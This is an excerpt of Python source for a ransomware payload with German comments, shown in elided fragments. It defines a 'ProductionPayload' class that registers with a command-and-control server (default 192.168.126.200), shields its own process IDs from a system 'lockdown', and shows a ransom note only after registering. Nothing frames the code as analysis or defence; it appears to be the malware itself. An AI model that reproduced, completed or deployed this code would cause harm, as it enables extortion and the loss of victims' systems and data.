...
# ╔════════════════════════════════════════════════════════════════╗
# ║             EXCLUDE OWN PROCESS FROM LOCKDOWN                  ║
# ║     Verhindert dass die Payload sich selbst sperrt             ║
# ╚════════════════════════════════════════════════════════════════╝

OWN_PROCESS_ID = os.getpid()
OWN_PARENT_PROCESS_ID = os.getppid()

print(f"[*] Own Process ID: {OWN_PROCESS_ID}")
print(f"[*] Parent Process ID: {OWN_PARENT_PROCESS_ID}")

# Speichere Process IDs in Environment Variable damit andere Scripts sie kennen
os.environ['RANSOMWARE_PAYLOAD_PID'] = str(OWN_PROCESS_ID)
os.environ['RANSOMWARE_PAYLOAD_PARENT_PID'] = str(OWN_PARENT_PROCESS_ID)
...
try:
    ...
    print(f"[!] Crypt modules import failed: {type(e).__name__}: {e}")
...
class ProductionPayload:
    ...
    def __init__(self, c2_host='127.0.0.1', c2_port=5000, max_retries=5):
        ...
        # EXCLUDE OWN PROCESS
        self.own_pid = OWN_PROCESS_ID
        self.parent_pid = OWN_PARENT_PROCESS_ID
        
        self.log(f"[INIT] Payload initialized - Ransom ID: {self.ransom_id}")
        self.log(f"[INIT] C2 Server: {self.c2_url}")
        self.log(f"[INIT] Protected Process IDs: {self.own_pid}, {self.parent_pid}")
    
    def is_protected_process(self, pid):
        """Prüfe ob Prozess geschützt ist (eigener Prozess)"""
        try:
            pid = int(pid)
            if pid == self.own_pid or pid == self.parent_pid:
                self.log(f"[PROTECTED] Process {pid} is protected (own process)", "WARN")
                return True
            return False
        except:
            return False
...
"""
    ...
    def run(self):
        ...
        try:
            ...
            # WICHTIG: Phase 2 MUSS erfolgreich sein bevor GUI gezeigt wird!
            registration_success = False
            for attempt in range(5):
                self.log(f"Registration attempt {attempt + 1}/5...")
                if self.phase_2_registration():
                    registration_success = True
                    break
                time.sleep(5)
            
            if not registration_success:
                self.log("Phase 2 failed after 5 attempts! Aborting.", "ERROR")
                return False
            
            # NUR wenn registriert wurde - zeige Ransom Note!
...
def main():
    ...
    parser.add_argument('--c2-host', default='192.168.126.200', help='C2 Server hostname')
